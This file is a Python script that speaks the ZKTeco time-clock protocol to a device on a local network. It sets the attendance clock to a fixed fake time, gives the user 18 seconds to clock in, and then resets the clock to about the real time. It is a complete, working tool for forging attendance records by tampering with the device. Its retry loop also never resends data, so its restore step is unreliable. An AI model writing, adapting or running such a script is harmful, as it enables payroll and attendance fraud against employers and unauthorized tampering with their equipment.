import socket
import sys
import codecs
import struct
import datetime
import time
import sys

"""
Author: Edgar
More info: https://github.com/adrobinoga/zk-protocol/blob/master/protocol.md
"""

reply_number_count = 1
delay = 18 #Tiempo que tengo para checar

def initSocket():
    HOST, PORT = "192.168.1.199", 4370
    # Create a socket (SOCK_STREAM means a TCP socket)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Conecta al servidor reloj
        sock.connect((HOST, PORT))
        #Siempre debe ser la primera cadena a enviar para iniciar la comunicación y recibir la session_id
        sock.send(bytes.fromhex('5050827d08000000e80317fc00000000')) 

        session_id = getSessionId(sock.recv(1024))
        if session_id == False:
            sock.close()
            print("**Error al enviar o recibir los datos")
            sys.stdout.flush()
            return False
        else:
            payload = setPayloadDateTime(session_id, True)
            data_to_send = bytes.fromhex('5050827d0c000000') + payload
            print(data_to_send.hex())
            sock.send(data_to_send)

            session_id_b = getSessionId(sock.recv(1024))
            if session_id_b == False:
                sock.close()
                print("**Error al enviar o recibir los datos")
                sys.stdout.flush()
                return False
            else:
                print(f"Modificacion exitosa. Se volvera a cambiar la hora en {delay} segundos")
                timer() 
                payload = setPayloadDateTime(session_id, False)
                data_to_send = bytes.fromhex('5050827d0c000000') + payload
                print(data_to_send.hex())
                sock.send(data_to_send)
                session_id_c = getSessionId(sock.recv(1024))
                #session_id_c = True
                tries = 0
                while session_id_c == False:
                    time.sleep(3)
                    if tries > 2:
                        print("***No se puede actualizar la hora, intente manualmente***")
                        break
                    print("**Error al intentar modificar la hora, se intentara de nuevo")
                    sys.stdout.flush()
                    payload = setPayloadDateTime(session_id, False)
                    data_to_send = bytes.fromhex('5050827d0c000000') + payload
                    print(data_to_send.hex())
                    #session_id = getSessionId(sock.recv(1024))
                    tries += 1

                print("Proceso completado")
                sys.stdout.flush()
                sock.close()


def sendData(socket, data_to_send):
    print(data_to_send.hex())
    socket.send(data_to_send)

    session_id = getSessionId(socket.recv(1024))

    return session_id

"""
Recibe un HEX para extraer la SESSION_ID
"""
def getSessionId(data):
    session_id = False
    success = bytes(data[8:10])
    if success == bytes.fromhex('d007'): #0xD007 es el HEX a esperar de una comunicación exitosa, siempre
        session_id = bytes(data[12:14])
    
    return session_id

"""
Racibe la SESSION_ID y regresa los datos a enviar
"""
def setPayloadDateTime(session_id, poison):
    #Hexadecimal preestablecido que indicará al host que se cambiará la hora
    command = bytes.fromhex('ca00')
    reply_number = bytes.fromhex('1000')
    if poison == False:
        reply_number = bytes.fromhex('2000')

    data_time = getDateTime(poison)

    payload = command + session_id + reply_number + data_time
    checksum = getCheckSum(payload)
    
    payload = command + checksum + session_id + reply_number + data_time
    #print(payload.hex())
    return payload

"""
Recibe el payload para calcular y regresar el checksum
""" 
def getCheckSum(payload):
    chk_32b = 0 # accumulates short integers to calculate checksum
    j = 1 
    
    if len(payload)%2 == 1:
        payload += bytes.fromhex('0000')

    while j<len(payload):
        # extract short integer, in little endian, from payload
        num_16b = payload[j-1] + (payload[j]<<8)
        # accumulate
        chk_32b = chk_32b + num_16b
        # increment index by 2 bytes
        j += 2 

    chk_32b = (chk_32b & 0xffff) + ((chk_32b & 0xffff0000)>>16)
    chk_16b = chk_32b ^ 0xFFFF
    checksum = struct.pack('<H',chk_16b)
    
    return checksum

"""
Se llama para obtener el DateTime codificado en HEX. Recibe TRUE/FALSE para saber si la hora va a cambiar a una hora deseada o si se quiere restaurar la hora actual
"""
def getDateTime(poison):
    current_dt = datetime.datetime.now()
    year = current_dt.year
    month = current_dt.month
    
    if poison == True:
        day = 12
        hour = 9
        minute = 14
        second = 5
    else:
        day = current_dt.day   
        hour = current_dt.hour
        minute = current_dt.minute - 2
        second = current_dt.second

    encoded_time = ((year%100)*12*31+((month-1)*31)+day-1)*(24*60*60)+(hour*60+minute)*60+second
    print(checkDateTime(encoded_time))

    #Converts encoded_time to HEX LittleEndian
    packed_time = struct.pack('<I',encoded_time)
    #print(packed_time.hex())
    return packed_time

"""
Convierte el tiempo codificado en una String legible
"""
def checkDateTime(encoded_time):
    second = int(encoded_time % 60)  # seconds
    minute = int((encoded_time / 60.) % 60)  # minutes
    hour = int((encoded_time / 3600.) % 24)  # hours
    day = int(((encoded_time / (3600. * 24.)) % 31)) + 1  # day
    month = int(((encoded_time / (3600. * 24. * 31.)) % 12)) + 1  # month
    year = int((encoded_time / (3600. * 24.)) / 365) + 1999  # year

    return f'{year}/{month}/{day} {hour}:{minute}:{second}'


    
def timer():
    for remaining in range(delay, 0, -1):
        sys.stdout.write("{:2d} segundos restantes".format(remaining))
        sys.stdout.write("\r")
        sys.stdout.flush()
        time.sleep(1)

initSocket()